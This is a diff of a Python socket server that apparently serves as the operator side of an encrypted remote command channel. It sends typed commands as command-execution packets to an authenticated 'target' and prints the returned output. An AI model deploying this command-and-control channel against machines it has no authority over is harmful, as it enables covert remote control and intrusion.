@@ -3,6 +3,11 @@ import _thread as thread
 import subprocess
 import tools.cipher as cipher
 import settings.keys as keys
+import json
+from tools.packet_manager import p_manager
+import time
+from tools.dictionary import *
+from tools.utils import packet_send, packet_recv
 
 class baseServer():
     def __init__(self, port, listen=1):
@@ -29,37 +34,63 @@ class baseServer():
 
     def receiver(self, conn, cipherClass):
         while(True):
-            response = conn.recv(2048)
-            if len(response) <= 0:
+            try:
+                packet = packet_recv(cipherClass=cipherClass,
+                            conn=conn,
+                            decrypt=True)
+            except:
                 continue
-            print(cipherClass.decrypt(response).decode())
+            print(packet[PK_PAYLOAD_FLAG])
 
     def sender(self, conn, cipherClass):
         while(True):
             command = input()
             if len(command) <= 0:
                 continue
-            conn.send(cipherClass.encrypt(command.encode()))
+            try:
+                packet_send(command=COMMAND_LINE_EXE,
+                            payload=command,
+                            cipherClass=cipherClass,
+                            conn=conn,
+                            encrypt=True)
+            except Exception as e:
+                print("Error sending command.")
 
-    def startConnection(self, connection,key=keys.CONN_PASSWORD):
-        #Enter Needed connection to start
+
+    def authenticate(self, conn, cipherClass):
         while(True):
             try:
-                IV = cipher.generateIV()
-                connection[0].send('SRT'.encode()+IV)
-                response = connection[0].recv(2048)
-                if (response[3:]==IV):
+                password = cipher.generateIV().hex()
+                packet_send(command=COMMAND_START,
+                            payload=password,
+                            cipherClass=cipherClass,
+                            conn=conn)
+
+
+                packet = packet_recv(cipherClass=cipherClass,
+                            conn=conn,
+                            decrypt=False)
+
+                if packet[PK_COMMAND_FLAG] == COMMAND_ACKNOWLEDGE and packet[PK_PAYLOAD_FLAG] == password:
                     break
                 else:
                     print("Configuration error. Socket returned a different Initialization Vector")
+                    time.sleep(1)
                     continue
             except socket.timeout:
                 continue
             except:
                 print("Error, connection from client lost.")
-                return
+                return False
+        print("Target authenticated.")
+        return True
 
-        cipherClass = cipher.cipher(key=key,IV=IV,generatedIV=True)
+    def startConnection(self, connection,key=keys.CONN_PASSWORD):
+        #Enter Needed connection to start
+        cipherClass = cipher.cipher(key=key)
+
+        if (self.authenticate(connection[0], cipherClass) == False):
+            return
 
         receiver = threading.Thread(target=self.receiver,args=(connection[0],cipherClass))
         sender = threading.Thread(target=self.sender,args=(connection[0],cipherClass))
@@ -69,7 +100,6 @@ class baseServer():
 
     def __del__(self):
         self.sock.close()
-
 
 if __name__ == "__main__":
     PORT = int(sys.argv[1])
